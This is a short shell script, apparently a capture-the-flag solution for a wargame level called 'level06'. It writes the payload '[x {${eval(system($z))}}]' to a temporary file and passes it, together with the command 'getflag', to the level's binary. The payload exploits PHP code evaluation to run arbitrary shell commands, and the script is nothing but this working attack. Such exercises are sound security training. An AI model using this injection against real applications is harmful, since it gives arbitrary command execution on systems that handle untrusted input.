#!/bin/sh

mkdir /tmp/toto;

# [x {${eval(system($z))}}]
echo "[x {\${eval(system(\$z))}}]" > /tmp/toto/somefile;

./level06 /tmp/toto/somefile getflag
